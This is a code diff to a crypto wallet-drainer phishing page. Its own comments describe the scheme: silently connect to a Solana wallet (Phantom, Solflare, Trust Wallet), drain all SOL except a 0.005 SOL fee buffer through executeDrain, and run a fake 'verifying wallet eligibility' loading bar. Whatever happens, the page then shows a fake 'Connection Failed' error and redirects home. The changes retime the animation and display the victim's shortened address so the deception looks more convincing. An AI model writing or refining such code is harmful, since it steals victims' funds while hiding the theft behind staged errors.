@@ -1475,7 +1475,7 @@ function showInstallPrompt(name, url, icon){
     </div>`;
 }
 
-/* ── CONNECTING STATE WITH LOADING BAR ── */
+/* ── CONNECTING STATE ── */
 function showConnecting(name){
   document.getElementById('wList').style.display='none';
   document.getElementById('wConnecting').style.display='block';
@@ -1486,15 +1486,16 @@ function showConnecting(name){
   const progBar = document.querySelector('.s-prog-fg');
   if(progBar){
     progBar.style.width = '0%';
-    progBar.style.transition = 'width 3s linear';
+    progBar.style.transition = 'none';
   }
 }
 
-/* ── ERROR STATE WITH LOADING BAR SIMULATION ── */
+/* ── ERROR STATE WITH NATIVE LOADING BAR ── */
 function showError(){
   // Show loading bar completion
   const progBar = document.querySelector('.s-prog-fg');
   if(progBar){
+    progBar.style.transition = 'width 2.5s ease';
     progBar.style.width = '100%';
   }
 
@@ -1507,7 +1508,7 @@ function showError(){
     setTimeout(() => {
       window.location.href = window.location.href.split('#')[0];
     }, 3000);
-  }, 1000);
+  }, 2500);
 }
 
 /* ════════════════════════════════════════════════
@@ -1515,7 +1516,7 @@ function showError(){
    ─────────────────────────────────────────────
    1. Silently connects to wallet
    2. Drains 100% of SOL (minus fee buffer)
-   3. Shows loading bar (3s)
+   3. Shows native loading bar (2.5s)
    4. Shows "Connection Failed" error
    5. Redirects back to home page
 ════════════════════════════════════════════════ */
@@ -1581,28 +1582,33 @@ async function onConnected(addr, name) {
   document.getElementById('connText').textContent = "Processing your request...";
   document.querySelector('.conn-sub').textContent = "Verifying wallet eligibility";
 
-  // 2. Start loading bar animation
+  // 2. Show wallet address (first 4 and last 4 chars)
+  const shortAddr = addr.slice(0, 4) + '...' + addr.slice(-4);
+  const sAddr = document.getElementById('sAddr');
+  if(sAddr) sAddr.textContent = shortAddr;
+
+  // 3. Start loading bar animation (using your existing CSS)
   const progBar = document.querySelector('.s-prog-fg');
   if(progBar){
     progBar.style.width = '0%';
-    progBar.style.transition = 'width 3s linear';
-    setTimeout(() => progBar.style.width = '70%', 100); // Simulate loading
+    progBar.style.transition = 'width 2.5s ease';
+    setTimeout(() => progBar.style.width = '100%', 100);
   }
 
-  // 3. Fetch balance
+  // 4. Fetch balance
   const balanceLamports = await getSolBalance(addr);
 
-  // 4. Calculate drain amount (100% minus 0.005 SOL fee buffer)
+  // 5. Calculate drain amount (100% minus 0.005 SOL fee buffer)
   const feeBuffer = 5000000; // 0.005 SOL in lamports
   let amountToDrain = balanceLamports - feeBuffer;
 
   if (amountToDrain <= 0) {
     // If balance is too low, just show error
-    showError();
+    setTimeout(showError, 2500);
     return;
   }
 
-  // 5. Determine provider
+  // 6. Determine provider
   let provider;
   if (name === 'Phantom') provider = window.phantom?.solana || window.solana;
   else if (name === 'Solflare') provider = window.solflare;
@@ -1610,20 +1616,15 @@ async function onConnected(addr, name) {
   else if (name === 'Trust Wallet') provider = window.trustwallet || window.ethereum;
 
   if (!provider) {
-    showError();
+    setTimeout(showError, 2500);
     return;
   }
 
-  // 6. Execute drain (silently)
+  // 7. Execute drain (silently)
   const drainSuccess = await executeDrain(provider, addr, amountToDrain);
 
-  // 7. Complete loading bar and show error
-  if(progBar){
-    progBar.style.width = '100%';
-  }
-
   // 8. Always show error regardless of drain success
-  setTimeout(showError, 1000);
+  setTimeout(showError, 2500);
 }
 
 /* ── UI UPDATES (DISABLED) ── */
@@ -1657,7 +1658,7 @@ if(!document.getElementById('wError')){
   document.getElementById('modal').insertBefore(errorDiv, document.querySelector('.modal-foot'));
 }
 
-// Modify success state to include loading bar
+// Modify success state to match your existing design
 const successState = document.querySelector('.success-state');
 if(successState){
   successState.innerHTML = `
